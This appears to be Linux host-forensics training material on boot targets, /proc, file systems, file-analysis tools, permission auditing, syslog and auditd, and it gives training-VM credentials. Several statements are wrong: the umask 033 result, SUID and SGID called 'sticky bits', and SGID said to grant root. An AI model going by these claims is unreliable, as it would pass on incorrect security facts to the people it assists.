The following list contains the most basic services required by the sysinit.target configuration:

Mounting file systems

Setting up swap files

Setting up cryptographic services

Starting the Userspace Device Manager (UDEV)

Setting the random generator seed

When the above services are complete, the dependencies for sysinit.target are resolved and systemd initiates the services required by a target further up the dependency chain, such as those required by basic.target. These required services include the following:

Timers: Scheduled services.

Sockets: Services listening to a network socket by default.

Paths: File path-triggered services.

After basic services are started, the dependencies for emergency.target and multi-user.target are resolved. Depending on the default.target setting, the graphical.target configuration is resolved, and the boot ﻿ process ends .

Linux Process Directory The process directory is a unique virtual directory that contains many useful artifacts for understanding the state of running processes and memory on a system. This virtual file system is not representative of data on the hard disk, but encapsulates the Linux philosophy of representing all data, including these objects which exist in memory, as a file. Each process is represented by a directory named for its Process Identifier (PID) and contains a standard structure of subdirectories and files which represent various elements of the process, which are explained below.

﻿

Process Directory Tree ﻿

/proc/PID/cmdline ﻿

The file cmdline contains the command-line arguments. However, since it contains them as a list, there is no whitespace in the output.

/proc/PID/cwd

The file cwd is a symbolic link to the current working directory of the process.

/proc/PID/environ ﻿ The file environ contains the values of environment variables in use by the process.

/proc/PID/exe ﻿ The file exec contains a symbolic link to the executable of this process. Since the inode remains active until the process has died, even if the binary on disk is deleted, it may be retrieved forensically from this hard link while the process remains alive. This is why it is important to preserve the running state of a compromised system, as long as that system is contained from the rest of the network.

/proc/PID/fd ﻿ fd is a directory containing all file descriptors associated with a process.

/proc/PID/status ﻿ The file status lists the process status in human-readable form.

Notable Proc Files ﻿ /proc/cpuinfo

The file cpuinfo contains information about the processor, such as its type, make, model, and performance.

/proc/devices ﻿ The file devices contains a list of device drivers configured into the currently running kernel (block and character).

/proc/meminfo ﻿ The file meminfo contains information about memory usage, both physical and swap.

/proc/mounts ﻿ The file mounts is a list of mounted file systems. The mount command uses this file to display its information.

/proc/net ﻿ The net directory contains status information about network protocols.

/proc/sys

The sys directory is not only a source of information, but also serves as an interface for parameter change within the kernel. These changes may be performed by echoing a new value into the respective file as the root user. An example of this change would be to turn on packet forwarding by editing the file /proc/sys/net/ipv4/conf/all/forwarding. Though since these changes are made to a virtual file system rather than the physical drive, they do not persist through a reboot.

/proc/sys/fs

The fs subdirectory contains file system data, such as file handle, inode, and quota information.

/proc/sys/kernel

The kernel directory reflects general kernel behaviors and the contents are dependent upon the configuration. The most important files are located here, along with descriptions of what they mean and how to use them.

/proc/version ﻿ The version file displays the kernel version.

Linux File System Types and Journaling The underlying system that manages the hard drive, its volumes, and data reads and writes is the type of file system, of which the Extended File System (Ext) is the most common. The Ext2, Ext3, and Ext4 versions of this file system implemented a concept known as journaling to ensure that data is properly written to the file system, even if interrupted by a system crash. ﻿ Journaling

Journaling is the process of recording file system changes to a data structure in order to recover a system state after a crash. Since everything in Linux is a file, the journal is no exception, and in the Ext4 file system, the journal’s inode number is usually 8.

In file systems that employ it, the journal is where all the information about the content of the file system is recorded. This log is used at boot time, when mounting the file system, to complete any file action that was incomplete due to an unexpected system shutdown or crash. Some journaling file systems do not employ a log and the journal contains only recent actions. The journal usually has limited space and old entries can be overwritten as soon as the corresponding actions have been written to disk, which typically takes no more than a few seconds.

While it is important to understand what journaling is and how it works in order to leverage it for forensics purposes, relying on the journal for robust file monitoring from a security perspective is not feasible. It is preferable to leverage a tool such as LoggedFS or Linux’s own audit subsystem to monitor sensitive file activity. The use of the audit subsystem for security monitoring is discussed in a later lesson. ﻿ Disks

Where different disk devices are denoted by C:\ or D:\ in the Windows OS, Linux names those devices under the /dev directory with the naming conventions sda or sdb. This “s” in this name refers to the Small Computer System Interface (SCSI) mass-storage driver, therefore SCSI driver A is sda, and SCSI driver B is sdb, etc.

Partitions﻿

Partitions are distinct storage units on a hard drive. These are recorded in the MBR in a data structure called the partition table. In newer operating systems, the partition table in the MBR has been replaced by GUID Partitioning Table (GPT), which introduces several modernization features.

There are three types of partitions, which are described below:

Primary: Any partition not explicitly created as an extended or logical partition. There are no more than four primary partitions on a disk drive. Partition numbers start at 1, so the four partitions of the /dev/sda drive would be sda1, sda2, sda3, and sda4. Primary partitions in the MBR are limited to 2 Terabytes (TB) in size. Any disk space beyond those partitions is marked as free, but to the operating system, since it is not partitioned, that space is unusable.

Extended: To overcome the primary partitioning problem, extended partitions are created. There is no limit to the number of subdivided partitions (logical partitions) under this extended partition, and any free space in this partition is still marked as usable. Only one extended partition may be configured on a single hard drive, so a common structure is to allocate three primary partitions and one extended partition which occupies the remaining hard disk space.

Logical: Subdivisions of an extended partition.

File Systems ﻿ Ext4

Ext4 is the latest version of the Ext family of file systems and is widely used. It continues to employ journaling to protect against data corruption. However, this file system does not support data deduplication, which is an automated storage management process of preventing excess data from being written to a file system. It also does not support transparent compression, which is the principle of allowing compressed files to be read and written to, just like regular files.

XFS ﻿ XFS is another journaling file system, and uses a log to write changes to before committing them to the file system. It is particularly suited for very large file systems, such as large storage arrays. It has even become the default file system for Red Hat Enterprise Linux, CentOS, and Oracle distributions.

Btrfs

Known as the “Better File System” (Btrfs) by its proponents, this system employs a copy-on-write (CoW) process to write data to disk rather than a strict journaling method. In this process, when a file is modified, the original file is read from disk, changes are made to its data and then the modified data blocks of that file are written to a new location rather than the original file location. This creates a copy and prevents loss of data in the event of a crash. When all new writes have been successfully completed, the file’s active data blocks are also updated, so that the file always references valid data blocks. This is a fault-tolerant method, in keeping with the file system creators’ philosophy. Since the file system is theoretically always in a correct state, a Btrfs file system does not employ journaling for file integrity.

Zettabyte File System (ZFS)

ZFS is a heavily memory-dependent file system, consuming large amounts of memory for the disk and volume management operations that it requires. It places a high priority on file integrity, employing the use of a checksum during every operation to ensure this. However, it is not a conventional journaling file system, though it employs a very similar construct to prevent data corruption during a crash. This construct is the ZFS Intent Log (ZIL). The system only writes to the ZIL rather than reads from it, unlike the journaling model in Ext4 and XFS file systems in which the journal is managed more. ZFS reads from the ZIL only during crash recovery, to restore proper data integrity for any failed writes. After any file action is successfully performed, the entry is removed again, making this structure unappealing for forensic analysis.

﻿Linux File System Analysis Tools The tools described below are useful for determining the characteristics of a Linux device’s file system and the subdirectories in it. Understanding the usage of disk space, the type of file systems present on a disk, and the number and types of mounted drives is important for an analyst to understand before conducting any further forensic copying or analysis of a compromised system.

File System Analysis Tools ﻿ dd

The dd utility is used to clone disks or portions of disks. It is useful to recover deleted files if that data is not already overwritten.

du

The du utility is used for displaying the disk usage of various files or directories on a file system. The ideal use case for this command is to understand how each directory and all subordinate files and directories contribute to the disk usage of a location in the file system.

df ﻿ The df utility is used for displaying used and free disk space in a file system. With the -T flag, it can also be used to display the type of file system for each entry. The flag -h also prints sizes in human-readable format.

mount The mount utility is used to mount file systems for access, such as Network File Systems (NFS) or external drives. It is also useful in displaying information about those mounted file systems. When used to display information, this utility prints the output of the /proc/mounts file.

lsblk The lsblk utility lists all attached block devices on a machine. Optimally, the flag -f lists the file system type and UUID.

blkid ﻿ Like lsblk, blkid is used to list block devices on a system, along with the UUID and type of file system and label of the device, if set. However, this command provides less information about the devices to the user and requires root permissions to run.

debugfs

The debugfs utility is a file system debugger employed in the ext family of file systems.

Linux File Analysis The utilities listed below are native to the Linux operating system, so they are present and available for a host analyst’s use in characterizing the type, function, and metadata of unknown files on a Linux system. If the file is an executable, several of these tools reveal the code linked to the binary file, which is used in behavior analysis of an executable. Both static and dynamic analysis of any files an adversary may have modified or left on a compromised system are objects of interest in a Threat Hunt and Incident Response, so as to determine what tradecraft that adversary employed and which indicators of compromise may be employed to identify other compromised systems.

File Analysis Binaries ﻿ strings ﻿ The strings utility extracts all human-readable strings from a file and prints them to standard output. It is useful for finding artifacts left behind in malicious binaries that reveal a binary’s purpose or information about potential authors. However, this kind of data is also inserted for misdirection by particularly savvy threat actors. ﻿

It is often necessary to pipe the results of this command to a paging utility such as less or more, or to grep to search for specific string patterns. Below is the beginning of the output when running strings on the ls binary.

readelf ﻿ The readelf binary reads the metadata of an Executable and Linkable Format (ELF) object file. Different headers and metadata tags reveal different information about an ELF file, including where the sections of the file are located on the hard drive and what libraries and library calls are linked to it. It even prints a dump of information located in a specific section of the file.

The readelf binary is particularly useful for binary analysis when examining the linked library calls in the relocation symbol table. The functions listed may be looked up by name. Many functions, such as listen() and accept() for network operations, are straightforward in what functionality they give a binary. These entries may be singled out for analysis with the following command:

readelf -r ﻿ hexdump The hexdump binary is used to examine a hexadecimal representation of the actual data that a file contains. This can be useful for examining the magic bytes of a file, which are the first several bytes that an operating system uses to determine how to open a file or use which program to use to open or edit it.

If a file is expected to result in a lengthy hexadecimal output, the parameter

–length may be used to truncate the output. If the output is expected to contain American Standard Code for Information Interchange (ASCII) data, the flag

–canonical may be used to print the ASCII characters in conjunction with the hexadecimal data.

xxd ﻿ The xxd binary can perform all of the same functions as hexdump with one added functionality: It can take a hexadecimal data dump from a file and convert it back into binary data.

stat

The stat binary gives detailed information about a file’s metadata, including owner, permissions, creation time, modification time, and access time. This command may be run on any regular file and not only on executable binary files.

Stat displays the inode metadata for a file, including the following types of timestamps:

Access: The last time that the file was opened for any sort of operation, including reading.

Modify: The last time that the file was written to or appended.

Change: The last time any changes were made, which includes metadata such as file name changes, which may alter the change time without altering the modify time.

Birth/Creation: Records when the file and associated inode was first written to disk.

file

The file binary is used to display the file type of a particular file object. More specifically, it examines the magic bytes of a file to determine not just whether it is a regular file, but also whether it is an executable, an image, an ASCII text file, or something else.

ldd

The ldd binary is used to display the loaded dynamic dependencies of a file. It shows which libraries are linked to a file.

strace

The strace utility is used for a more dynamic analysis of a binary. It lists system calls as they occur, which provides even more granular insight into a binary’s behavior than static analysis of imports alone can reveal. It also displays data sent to those system calls, which analysis with strings or a hexdump may be difficult to find.

ltrace The ltrace utility is similar to strace but lists library calls instead of system calls. In all other ways it operates and provides value to file analysis.

Linux Directory Analysis Utilize directory analysis to determine which binary was most recently added to the file system. This analysis may be performed across all files and subfolders in a directory to determine what has recently changed or whether applications and users are abusing misconfigurations to access those directories.

﻿

Conduct Directory Analysis ﻿

Much of directory analysis involves comparing known standard layouts and included or expected files to a modified file system state. If a device is compromised, attackers may hide artifacts in locations that are unlikely to be viewed frequently or where they are lost in the noise of other similar files. Additionally, placing malicious software in one of the protected directories in the system path allows for the file to be executed from anywhere in the system.

In a terminal window in the VM kali-hunt, analyze the following directories and examine the creation times of the files to determine which binaries were most recently added to the protected binary directories. The next question refers to this step.
/bin ﻿ /sbin ﻿ /usr/bin ﻿ /usr/sbin

ls -alt

File Permissions Overview To understand how to find and correct any incorrectly assigned Linux permissions, it is important to first understand what the permissions are and what sort of access each permission gives to a file. It is also important to understand each special permission and how it affects the real access a user has to a file.

﻿

File Ownership ﻿

The Linux Operating System (OS) has three file ownership types — User, Group, and Other — and each has different roles and accesses. For every file in Linux, there can only be one user, one group, and one other, however, ownership types can be in various combinations. It is important to remember that although Linux views everything as a file, in this lesson, a file refers to directories as well. The Linux OS checks each file ownership type in a specific order to determine the proper access to the file or directory. Linux also has specific codes for each file ownership type: u for User, g for Group, and o for Other.

﻿

User ﻿

The User file ownership type is the owner of the file. This is usually the person who created the file, but file ownership can be transferred to other users. This is also the first file ownership type that Linux checks when reading the permissions to a file.

﻿

Group ﻿

Every user in Linux is part of a certain group or groups. Groups are created to manage Linux environments and provide proper security to them. When a user creates a file that user's primary group becomes the group owner for that file. The group that has ownership over the file can only be changed by the user that has ownership over the file or by a user logged in as root.

﻿

For example, if there are analysts and system administrators in a Linux environment, creating groups to manage saves time and provides security. The analysts do not need to access the same files as the administrators and the same can be said for the administrators. If groups are created, it also saves time because instead of manually adding permissions for each user, they can be added to a group and that group can have specific permissions over a file.

﻿

Other
﻿

Other is every user that has access to the Linux system that is not the user or a member of the group that has ownership of that file. This means that anyone with a valid account on the Linux system can access the file with the given permissions that the Other group has. It is vital to control the permissions of the Other file ownership because this can be a security risk if the correct permissions are not assigned.

﻿

Order of Permissions ﻿

When Linux checks permissions, it uses this order:

If the file is owned by the user, the User permissions determine the access. If the group of the file is the same as the user's group, the Group permissions determine the access. If the user is not the file owner and is not in the group, the Other permission is used. If users are denied permission, Linux does not examine the next group. ﻿ Permission Modes Every file in Linux has three different permission modes for the three different file ownerships: read, write, and execute. For the Linux permission modes, there is a difference between what read, write, and execute mean for files versus directories. When viewing the permissions on a Linux OS, there are codes for the different permission modes: r for read, w for write, x for execute, and - for permission not granted (rwx-).

﻿

Read ﻿

For files with read permissions (r), the contents of the file are able to be viewed or copied. The file contents cannot be modified or executed, only viewed. For directories with read permissions, the files within the directory can be listed and copied, but no files can be added or deleted. This means that the ls command can be used to view the files inside the directory but having read permission to a directory does not always mean that the contents of the files can be viewed.

﻿

Write ﻿

For files with write permissions (w), the contents are able to be modified. Anyone with write permissions for a file can add to the file or even overwrite the file. For users with write permissions for a directory, they can add and delete files from that directory. With write permissions to a directory, files can also be renamed or moved within that directory.

﻿

Execute ﻿

The execute permission mode (x) is the most unique and also complex of the three permission modes. This permission mode is specific to executable binaries and directories. If the file or program is executable, and the user has the execute permission mode, then the file can be run. If the file is a shell script, then adding the execute permission to it tells Linux to treat the file as if it were a program. Users can enter a specific directory using the command cd if they have the execute permission for that directory. The execute permission on directories also affects what level of information can be gained by using the commands ls or find.

﻿

For example, a user who only has read permissions for a directory can only use ls to list the files within a directory. However, a user who has read and execute permissions can use the command ls -al in order to list all of the files, including hidden files, and view other information about the files such as permissions, the owner of the file, file size, and creation date.

﻿

For example, the file myfile has permissions set to read, write, and execute for User (rwx), read and write for Group (rw-), and only read for Other (r–). The permissions for the file are listed as rwxrw-r–. If the file had the permissions set to read and write for the User (rw-), read and write for the Group (rw-), and only read for Other (r–), the permissions appear as rw-rw-r–, with the order of file ownership being User, Group, and Other. Directories also have a symbolic value of d, which is represented before the set of permissions to let users know that it is a directory and not a file. A regular file has a symbolic value of -.

Octal References Linux permissions can also be viewed or set using octal references instead of the rwx format. This method of specifying permissions can seem more complex at first but is actually easier to set permissions for files. Octal references refer to using octal numbers (digits 0 – 7) to represent each permission mode. Figure 4.3-2 details the reference values and how they are used to determine the permissions for a file or directory.

﻿

﻿

Figure 4.3-2

﻿

Read permissions use the number 4, write permissions use the number 2, and execute uses the number 1. The octal numbers representing each permission are added together to specify which permissions are given out to each file ownership type.

﻿

For example, the command chmod 444 myfile sets the permissions of myfile to read (4) for User, Group, and Other. The first number in the command above represents the User file ownership, the second number is the Group, and the third number is the Other.

﻿

The command chmod 644 myfile sets the permissions of myfile to User can read and write (4+2=6), Group can read (4), and Other can read (4) myfile. The command chmod 604 myfile sets the permissions to User can read and write (6), Group can do nothing (0), and Other can read (4) myfile. Lastly, the command chmod 777 myfile gives each file ownership type read, write, and execute permissions to myfile (4+2+1=7). This is the least restrictive permission and is considered dangerous by system administrators.

﻿

Linux Permissions Mask ﻿

When a user creates a file or directory, it is created with a default set of permissions. For example, if a new file was created and given the default permissions of 666, then read and write permissions (rw-rw-rw-) have been granted to everyone. Similarly, if a directory was created with the default permissions of 777 (rwxrwxrwx), then anyone can change the contents of the file because all users on the system have search access to the directory and write access to the file. This situation can be avoided by setting the umask value.

﻿

By default, files receive the rw-rw-rw- (666) permissions and directories receive rwxrwxrwx (777) permissions when they are created. This often leaves situations where excess permissions are given out. The umask command specifies the permissions to be subtracted from the default permissions when files and directories are created. For example, if 022 was subtracted from 777 for directories or 666 for files it would create directories with the permissions 755 (drwxr-xr-x) or files with 644 (rw-r–r–). ﻿

﻿

The default value for umask is 022 or 002 depending on the Linux distribution used. The umask value is subtracted from the default permissions after new files or directories are created. The command umask 066 results in file permissions of rw------- (600) and directory permissions of rwx–x–x (711). A umask of 033 results in file permissions of rw–wx-wx (633) and directory permissions of rwxr–r– (744).

Unique Permissions The Linux OS has unique permissions that can be set on files or directories to give that file or directory different characteristics. These special permissions allow users to run certain applications with other credentials, control how groups inherit permissions, and can keep files from being deleted or changed accidentally. Linux also has the ability to implement Access Control Lists (ACL) to allow administrators to define permissions for more than just one user or group.

﻿

Sticky Bit ﻿

A sticky bit is a special permission set on a file or an entire directory. It grants only the owner (User) of a file or directory the permission to delete or make changes to that file or directory contents. No other user can delete or modify the file or directory. It has the symbolic value of t and a numeric value of 1000. This special permission ensures that important files or directories are not accidentally deleted or modified.

﻿

﻿

Figure 4.3-3

﻿

The sticky bit also has a different meaning when applied to directories than when applied to files. If the sticky bit is set on a directory, a user may only delete files within that directory that they own or for which they have explicit write permissions granted to that file, even when they have write access to the directory. This is designed for directories like /tmp, to which all users have write permissions, but it may not be acceptable to allow any user to delete files at will within the directory.

﻿

Set User Identifier Bit ﻿

The Set User Identifier (SUID) bit replaces the execute permission to allow programs to run with the permissions of the file owner, not with the permissions of the user who runs the program. The most common use of the SUID bit is to allow users to run a command as the root user. Users do not become the root user, however, the command or program is run with root user permissions. Some programs require the SUID bit to be set to properly function, however, it should be used sparingly as it can be a security issue if used incorrectly. The SUID permission has the symbolic value of s in the first set of permissions for the User and a numerical value of 4000. Any file highlighted in red signifies that there is a SUID sticky bit set on it. Notice in Figure 4.3-4 that myfile has a sticky bit set.

﻿

﻿

Figure 4.3-4

﻿

Set Group Identifier Bit ﻿

The Set Group Identifier (SGID) bit is similar to the SUID bit in that it replaces the execute permissions for a program or directory. However, for a file, the program runs with the group permissions of the group owner. This allows all members of a group to execute the file with root permissions. For a directory, a newly-created file receives the same group owner as is assigned to the parent directory. This is often used to allow all users to write to a specific directory. The SGID bit has a symbolic value of S and a numeric value of 2000. It is present in the second set of permissions for the Group file ownership. Figure 4.3-5 shows the SGID sticky bit set for myfile.

﻿

﻿

Figure 4.3-5

﻿

Mutability ﻿

In situations where there are certain configuration files or other important files that need to be write-protected, the command chattr makes a file immutable, which is the best way to protect these files. While changing the ownership or permission bits on the file can also protect them, it cannot prevent any actions from being done with root privileges. This is where chattr can be used. Similar to chattr is lsattr, which shows the attributes set on a file.

﻿

The command chattr allows attributes to be set or unset on a file that are separate from the standard file permissions. Available attributes that can be set using chattr include the following:

a: Can be opened in append mode only.

A: Do not update time (file access time).

c: Automatically compressed when written to disk.

C: Turn off copy-on-write.

i: Set immutable.

s: Securely deleted with automatic zero.

To make a file immutable, the i attribute is added. For example, to write-protect the /etc/passwd file, the command is:

sudo chattr +i /etc/passwd ﻿

To set or unset the immutable attribute sudo privileges must be used. With the immutable attribute set, the file cannot be tampered with. To edit the file, the attribute needs to be removed with the command:

sudo chattr -i /etc/passwd

Viewing File Permissions There are multiple different ways to view the permissions on a file or directory on a Linux OS. The most popular command, and by far the most simple way to view permissions, is to use the ls command. The command namei is also useful. This command views information, such as permissions, for directories and files within a given path. It is useful when troubleshooting permissions errors or when trying to determine if the proper access is applied to a specific file or directory.

﻿

Viewing Permissions with the Command ls ﻿

The command ls is used to view a long listing of files and directories in the current directory. For example, if an analyst is in the /home/trainee directory and inputs the command ls, the output includes a list of the directories that exist within /home/trainee and any files that have been created. The command ls can also be used with a pathname to list the directory contents and permissions of directories outside the present working directory. The command ls -l /var/www/html/ lists the permissions of all the files or directories within the /html/ directory.

﻿

﻿

Figure 4.3-6

﻿

There are other ways that ls is used to view more detailed information such as the permissions and file owners. The command ls -l returns an output with detailed information about the permissions for each directory and file that exists within the present working directory. The command ls -al returns the same output and includes any hidden files that exist within the present working directory.

﻿

﻿

Figure 4.3-7

Figure 4.3-7 shows the permissions for all the directories and files within the /home/trainee directory. Looking at the permissions for the Desktop directory, it has the octal permissions of 755 which appear as drwxr-xr-x. As a reminder, the d stands for the directory, the rwx (read, write, execute) represent the permissions for the User file ownership, the r-x (read, execute) represent the permissions for the Group file ownership, and the r-x (read, execute) represent the permissions for the Other file ownership.

﻿

The octal permissions for the file myfile are 644 or -rw-r–r–. The first - represents a file instead of a directory. The rw- (read, write) represent the permissions for the User file ownership, the r– (read) represents read-only permissions for the Group file ownership, and the r– (read) represent read-only permissions for the Other file ownership type.

﻿

Viewing Permissions with the Command namei ﻿

The command namei is used to view more information about the directories that exist within a path. It can be used to view the permissions, owner, or creation date of directories or files. The namei command uses pathnames as arguments so the syntax to view the permissions for a given pathname looks similar to:

namei -l /home/trainee/Downloads ﻿

That output returns the permissions and file owner for all the directories listed in the path name.

﻿

﻿

Figure 4.3-8

﻿

Viewing File Permissions ﻿

Identify file permissions of several different files using the commands learned.

﻿

Workflow ﻿

Log in to the Virtual Machine (VM) kali-hunt using the following credentials:
Username: trainee Password: CyberTraining1! ﻿

Open a terminal console.
﻿

Run the following code to change directories:
cd lab ﻿

Run the following code to view the files within the lab directory:
ls ﻿

Run the following code to view the file permissions and file owner of the file myfile:
ls -l myfile ﻿

This file has the permissions read, write, execute for User, read and execute for Group, and read for Other.

﻿

Run the following command to view the permissions for both files within the lab directory:
ls -l ﻿

Look at the permissions for the file project. It has read, write, and execute permissions for all three file ownership types. This is considered the least secure type of permission, and this file is considered insecure.
﻿

Run the following commands to create a file, and look at the default permissions for that file:
touch myfile2 ls -l myfile2 ﻿

The default permissions for any newly-created files for this system are read and write for User, read for Group, and read for Other.

﻿

Run the following command to change to the home/trainee/analyst directory:
cd ../analyst

Securing Linux Files There are a number of different commands that Linux offers in order to modify the permissions of a file or directory. These include chmod, chown, and chgrp. Each serves a specific purpose when modifying permissions for a file or directory. For each of these commands, utilize Table 4.3-1 to set the correct permissions.

﻿

﻿

Table 4.3-1

﻿

chmod ﻿

The chmod command changes permissions for a specified file. It adds or subtracts permissions from a file, and is used to explicitly set the permission value for a file equal to the specified permissions. There are two ways to set the permissions, octal and symbolic (r,w,x).

﻿

The following are the different syntaxes that can be used with chmod.

﻿

chmod (file ownership)+(permission)

Adds a permission. The following command adds the execute permission to the file myfile for the User, Group, and Other:

chmod u+x,g+x,o+x myfile ﻿

chmod (file ownership)-(permission)

Subtracts permissions. The following command subtracts the write permissions from the Group and Other for myfile but leaves the User permissions untouched:

chmod g-w,o-w myfile ﻿

chmod (file ownership)=(permission)

Sets the permission equal to the permission specified for a User, Group, or Other for a file or directory. The following command sets the User permissions for the file myfile to read, write, and execute:

chmod u=rwx myfile ﻿

chmod (octal number)

Sets the permissions explicitly to what is represented with the octal reference numbers. The following command sets the permissions of myfile to User read, write, and execute (7) and Group and Other to execute (1):

chmod 711 myfile ﻿

chown and chgrp ﻿

The chown command is used to alter the User and Group ownership of files and directories. This command changes ownership of a directory recursively throughout the directory tree, or it can change the Group ownership to a single file or directory. This command is frequently used in environments where files need to be shared in a specific group.

﻿

To only change the User file ownership, the command is:

chown trainee myfile ﻿

This sets the User file ownership of the file myfile to the user trainee. If a colon is used after the username, the Group ownership of the file is changed as well. The following command makes trainee the User owner and analyst the Group owner of the file logs:

chown trainee:analyst /project/logs ﻿

The commands chown and chgrp change the Group ownership and are used to recursively change the Group ownership of a file or directory throughout a directory tree. The following command sets the analyst group as the owner of all files within the /project directory:

chown :analyst -R /project ﻿

The following command makes the analyst group the owner of the file logs:

chgrp analyst /project/logs ﻿ Common Permissions Misconfigurations When a user is given a permission setting that provides access to a wider range of files than is required, this can lead to the exposure of sensitive information or the unintentional modification of files. This is particularly dangerous when users have access to program configuration files or important executables. Not only can a user unintentionally modify these files but adversaries can exploit weak permissions on files that are set to world-readable or readable by anyone with access to the system.

﻿

For example, the default permissions for home directories is 755, which means that users who have access to the system can view the contents of other home folders. Some users may have scripts or backups of files in their home folders that contain sensitive information.

﻿

Other commonly misconfigured files include the following:

Bootloader Configuration Files System and Daemon Configuration Files Firewall Scripts Web Service Web files/directory Configuration files/directory Sensitive files (encrypted data, password, key)/directory Log files (security logs, operation logs, admin logs)/directory Executables (scripts, EXE, Java Archive [JAR], class, Hypertext Preprocessor [PHP], Active Server Pages [ASP])/directory Database files/directory Temporary files /directory Upload files/directory

Conducting File Permissions Audit The Linux find command is useful to find specific files based on the criteria added to the command. It is used to find specific filenames, permissions, users, file types, etc. The find command locates permissions that are set incorrectly and performs an audit on a file system.

﻿

World-Writable Files ﻿

World-writable files are files that anyone who has access to the Linux system has write permissions to. One of the main causes of world-writable files is incorrect default permissions for new files and folders. This can be fixed by setting a correct umask of 002. However, to ensure there are no files with incorrect permissions, an audit should be performed to check for these files. This can be done using the find command.

﻿

The command to search for world-writable files is:

find /dir -xdev -type f -perm -0002 -ls ﻿

The /dir is the directory that should be searched. This lists any files that meet the requirements specified, which is in this case, the Other file ownership type having write permissions. To disable world-writable access to a file, the chmod command is used. chmod o-w myfile removes writable access for Other to the file myfile.

﻿

Incorrect SUID Permissions ﻿

An incorrectly assigned sticky bit is dangerous because it allows anyone to potentially run a file as a root user. If a file is owned by the root and has the SUID bit set, then it runs with root user permissions. If an adversary compromises a system and comes across a file with root permissions, it can use the file to perform remote commands on the system with root-level permissions. These files can be audited, similarly to how world-writable files were found.

﻿

The command to search for an incorrectly assigned SUID bit is:

find /dir -uid 0 -perm -4000 -type f 2>/dev/null | xargs ls -la ﻿

The /dir can be replaced with the directory that should be searched. This command can also be edited to check for an incorrectly assigned SGID bit. The following command finds any SGID bits that are incorrectly assigned:

find /dir -group 0 -perm -2000 -type f 2>/dev/null | xargs ls -la ﻿

Find and Correct the Incorrect File Permissions ﻿

Use the information learned to find and set file permissions that were incorrectly set on a system critical file within the /etc directory. Use sudo to search the /etc directory. Once the file is located, set the permissions to read and write for User, read for Group, and none for Other.

﻿find /etc -xdev -type f -perm -0002 -ls can replace /etc for better search

Linux Logging Basics Linux OSs collect a wide array of technical information and data regarding the host. The collected data contains information on a wide variety of categories, such as communications sent and received or user actions. The logs allow security and engineers on the hosts to see nearly every action performed on the OS.

﻿

Common Logs for Linux ﻿

Analysts should be familiar with the following common logs for Linux:

System logs

Audit logs

Log directories

﻿

System Logs﻿

﻿

The syslog protocol, as defined by RFC 3164, provides a means to send event notifications across IP networks to event message collectors. The event message collectors are referred to as syslog servers. Syslog enables the collection of Linux device data such as statuses, events, and diagnostics. The messages developed by syslog provide status information about the host over a period of time.

﻿

Audit Logs﻿

﻿

The Linux Audit system is a framework and a kernel feature that provides audit logs. Audit logs are developed specifically for security-related events and actions. The audit logs can be used by security analysts to review and monitor system actions with the goal to identify suspicious activity. A key component of audit logs is the feature which enables users to develop and configure rules that have defined parameters. The auditing rules can be written to collect information regarding system calls, access to a specific file, or authentication events.

﻿

Log Directories﻿

﻿

By default, Linux log files are stored in plain text files within specified directories on the host. Table 4.4-1, below, displays the default Linux directories and the information collected in each.

﻿The syslog protocol provides devices a means to send messages across networks to message collectors. Syslog has been used for decades as a reliable log collection framework for Linux and Unix OSs.

Layers

Syslog contains three layers that help define the content within messages, their encoding and storage, and how they are transported. These layers are presented in Figure 4.4-1, below:

Severity and Facility Codes

Severity codes indicate the priority and importance of each message. Table 4.4-2, below, displays syslog severity codes and is viewable within the console by executing the following command: man syslog

The severity code and the severity name are synonymous within the Linux command line. The two commands below execute the same commands, regardless of whether the severity code or severity name is entered.

iptables -A INPUT -p icmp --icmp-type echo-request -j LOG --log-level informational --log-prefix "ping"

iptables -A INPUT -p icmp --icmp-type echo-request -j LOG --log-level 6 --log-prefix "ping"

Facility codes indicate where and how to store the message on the syslog server. The facility code architecture organizes and keeps the syslog server searchable. Table 4.4-3, below, displays the syslog facility codes:

Format

Syslog contains a standard format usable with all devices and applications. This format is Figure 9.4-2, below, highlights the three sections of syslog’s format in a syslog entry. In the illustration, the sections are labeled numerically, as follows: Header Structured data Message

The header (1) contains information regarding the Facility, Version, Time, Date, Host Name, Application, Process Identifier (ID), and Message ID. The image below shows the header and the information that composes it. The header comprises only the information preceding the structured data fields.

The structured data section (2) includes the fields Structured-Data and Encoding. Logs can be encoded in different structures, so the structured data comprises how the data is formatted. Most syslog messages are encoded using 8-bit Unicode Transformation Format (UTF-8), however, this can be adjusted based on the needs of the message.

The message section (3) includes everything following the Encoding field. The Message field contains information about the syslog entry. The message contains details pertaining to why the specific entry was recorded. One example of data contained in the message field is a failed logon attempt, as presented in the figure below.

NOTE: The syslog file format is customizable and may differ from the standard format due to configurations defined in /etc/rsyslog.conf or /etc/rsyslog.d/, altering timestamp, metadata, or message structure to suit logging needs. This customizability allows for flexibility to adapt to specific logging requirements.

Audit Basics The Linux Audit system collects data across multiple categories based on defined rules. Each rule defines which data to collect and what categories to place it in. The Linux Audit log categories and rules are described below.

﻿

Audit Log Categories ﻿

The Audit system collects data across the following three categories:

System calls: The data identifies which system calls were called, along with contextual information such as the arguments passed to it and user information. File access: This is an alternative way to monitor file access activity, rather than directly monitoring the open system call and related calls. Select: These are pre-configured auditable events within the kernel.

Audit Log Rules ﻿

The data that the Audit system collects is based on a specified set of rules. The rules used by the Audit system define what data is captured and how it is handled. The command auditctl allows users to control the Audit system and implement new rules for the host. The rules are categorized into the following categories:

Control: Audit's system and user behaviors. File system or File watches: Audit's access or usage of a file or directory. System call: Audit's system calls on specified programs.

View and Create Audit Rules Linux Audit System Overview ﻿

The Linux Audit system collects logs that include data pertaining to the type of events, the date and time, system calls, files accessed, and processes used. The system contains rules that can be viewed, created, and modified. The next workflow introduces methods to use the Linux Audit system.

﻿

View Audit Rules and Status ﻿

The Linux Audit system includes rules that dictate what activity is logged. Complete the following workflow to view the rules and the current status of the Linux Audit system.

To view the audit rules enter the following command:
(trainee@kali-hunt)-[~] $ sudo auditctl -l ﻿

When prompted enter the password for trainee:
CyberTraining1! ﻿

The command -l in step 3 lists all rules that are on the host. It returns the following output:

No rules ﻿

NOTE: This workflow frequently employs the command sudo. Enter the password from step 4, each time the prompt requests it.

﻿

Check the status of the Audit system by entering the following command:
(trainee@kali-hunt)-[~] $ sudo auditctl -s ﻿

The command -s lists the status of the Audit system on the host. The top line of the output, enabled 1, indicates that the Audit system is active. If the system is not active, a value of 0 is returned.

﻿

Create a Filesystem Audit Rule ﻿

Continue working in the VM kali-hunt to complete the next workflow. This workflow explores commands to create audit rules based on the filesystem of the host.

﻿

The following syntax is used to create audit rules:

auditctl -w -p -k ﻿

